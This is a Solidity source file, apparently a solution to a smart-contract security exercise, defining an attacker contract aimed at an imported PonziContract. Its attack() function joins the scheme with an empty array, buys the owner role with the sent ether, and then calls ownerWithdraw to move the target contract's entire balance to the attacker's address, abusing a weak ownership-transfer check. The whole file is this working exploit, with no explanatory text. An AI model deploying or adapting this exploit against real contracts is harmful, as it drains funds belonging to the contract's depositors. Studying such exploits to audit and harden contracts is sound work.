// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PonziContract.sol";

contract PonziContractAttacker {
    PonziContract public pc;
    address public owner;

    constructor(address payable pc_) {
        pc = PonziContract(pc_);
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external payable {
        address[] memory array;
        pc.joinPonzi(array);
        pc.buyOwnerRole{ value: msg.value }(address(this));
        pc.ownerWithdraw(owner, address(pc).balance);
    }

    function victimBalance() external view returns (uint256) {
        return address(pc).balance;
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
